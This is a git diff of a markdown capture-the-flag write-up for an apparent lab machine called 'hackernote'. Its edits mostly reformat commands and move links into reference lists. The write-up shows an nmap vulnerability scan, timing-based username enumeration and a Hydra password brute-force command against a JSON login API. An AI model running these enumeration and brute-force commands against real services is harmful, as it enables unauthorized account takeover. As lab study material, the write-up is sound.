@@ -4,10 +4,11 @@
 
 ### Reconnaissance
 
-The target is 10.10.156.141. As usual, it looks like we're starting off with an [nmap](../notes/nmap.md) scan.
+The target is 10.10.156.141. As usual, it looks like we're starting off with an nmap scan.
 
 ```bash
-sudo nmap -v -oA hackernote -Pn -A -T4 -sS -script vuln -p- 10.10.156.141
+sudo nmap -v -oA hackernote -Pn -A -T4 -sS \
+          --script vuln -p- 10.10.156.141
 ```
 
 This gives the following output:
@@ -146,6 +147,8 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Mon Jan 31 18:38:35 2022 -- 1 IP address (1 host up) scanned in 1459.69 seconds
 ```
 
+* [Using “nmap”](../notes/nmap.md)
+
 ### Exploit
 
 The point of this exercise is to write a Python script to take advantage of the timing difference between trying to log in using a valid vs. invalid username.
@@ -183,43 +186,56 @@ References used while writing this:
 
 My general strategy here is to not get too fancy in Python, but rather just to output the time it takes to log in given a particular username and then do the subsequent analysis using normal shell tools.
 
-Saving the above script as `hackernote-user-enum.py` and using the [`Names/names.txt`](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt) list (which is the shorter -- as suggested -- of the two lists mentioned by the exercise), we create an ordered lists where those usernames that took longest to respond with an error message are listed last:
+Saving the above script as `hackernote-user-enum.py` and using the `Names/names.txt` list (which is the shorter -- as suggested -- of the two lists mentioned by the exercise), we create an ordered lists where those usernames that took longest to respond with an error message are listed last:
 
 ```bash
 chmod +x hackernote-user-enum.py
-unbuffer ./hackernote-user-enum.py 10.10.156.141 names.txt | tee hackernote-user-enum.out
+unbuffer ./hackernote-user-enum.py 10.10.156.141 \
+                                   names.txt | \
+         tee hackernote-user-enum.out
 cat hackernote-user-enum.out | sort -n
 ```
 
-The `unbuffer` command is used to [force line-buffering of stdout in a pipeline](https://stackoverflow.com/questions/11337041/force-line-buffering-of-stdout-in-a-pipeline#comment111940075_11337310).
+The `unbuffer` command is used to force line-buffering of stdout in a pipeline.
 
 Note that this takes a looong time. And we really need to run this process twice -- once with the full list, and once with only those names that initially took longer than 1.7 seconds (this is necessary because the web server seems to periodically hang when rapidly hit by requests; 1.7 seconds is chosen based on the time it takes to run the script against a test list composed of my known-good user and a couple of other names).
 
 The second run is, mercifully, much shorter, and makes it obvious that there is only a single valid user, `james`.
 
+* [SecLists / Usernames / Names / names.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt)
+* [Force line-buffering of stdout in a pipeline](https://stackoverflow.com/questions/11337041/force-line-buffering-of-stdout-in-a-pipeline#comment111940075_11337310)
+
 ### Attack Passwords
 
-The [Hashcat](../notes/hashcat.md) `combinator.bin` utility combines two wordlists such that every entry of the first list is concatenated with every entry from the second list.
+The Hashcat `combinator.bin` utility combines two wordlists such that every entry of the first list is concatenated with every entry from the second list.
 
 ```bash
-/usr/lib/hashcat-utils/combinator.bin $WORDLIST1 $WORDLIST2 > $COMBINED_WORDLIST
+/usr/lib/hashcat-utils/combinator.bin \
+	$WORDLIST1 $WORDLIST2 > $COMBINED_WORDLIST
 ```
 
-[Hydra](../notes/hydra.md) can be used to attack API endpoints that accept JSON (though apparently there can be some problems with the headers that are passed along):
+Hydra can be used to attack API endpoints that accept JSON (though apparently there can be some problems with the headers that are passed along):
 
 ```bash
-hydra -vV -f -l $USERNAME -P $PASSWORDLIST $HOST http-post-form $ENDPOINT:"$TEMPLATE":F="$INVALID":H="Content-Type\: application/json"
+hydra -vV -f -l $USERNAME -P $PASSWORDLIST \
+$HOST http-post-form \ 
+$ENDPOINT:"$TEMPLATE":F="$INVALID":H="Content-Type\: application/json"
 ```
 
-See [these](https://security.stackexchange.com/questions/57839/hydra-bruteforce-and-json) [two](https://security.stackexchange.com/questions/203501/bruteforce-using-hydra-with-json) Stack Exchange posts for details.
-
-The `$TEMPLATE` is basically the JSON request body with the special placeholders `^USER^` and `^PASS^` (colons escaped). `$INVALID` is a string that will appear for login *failures* (note that this string *cannot* contain a colon, but fortunately is a substring match). The `H` parameter at the end allows us to override specific headers (necessary because otherwise [Hydra](../notes/hydra.md) sends a Content-Type of application/x-www-form-urlencoded).
+The `$TEMPLATE` is basically the JSON request body with the special placeholders `^USER^` and `^PASS^` (colons escaped). `$INVALID` is a string that will appear for login *failures* (note that this string *cannot* contain a colon, but fortunately is a substring match). The `H` parameter at the end allows us to override specific headers (necessary because otherwise Hydra sends a Content-Type of application/x-www-form-urlencoded).
 
 Putting this all together, we have:
 
 ```bash
-hydra -vV -f -l james -P passwords.txt 10.10.156.141 http-post-form /api/user/login:"{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}":F="Invalid Username Or Password":H="Content-Type\: application/json"
+hydra -vV -f -l james -P passwords.txt \
+10.10.156.141 http-post-form \
+/api/user/login:"{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}":F="Invalid Username Or Password":H="Content-Type\: application/json"
 ```
+
+* [Using Hashcat](../notes/hashcat.md)
+* [Using Hydra](../notes/hydra.md)
+* [Hydra bruteforce and JSON](https://security.stackexchange.com/questions/57839/hydra-bruteforce-and-json)
+* [Bruteforce - Using Hydra with JSON](https://security.stackexchange.com/questions/203501/bruteforce-using-hydra-with-json)
 
 ### Escalate
 
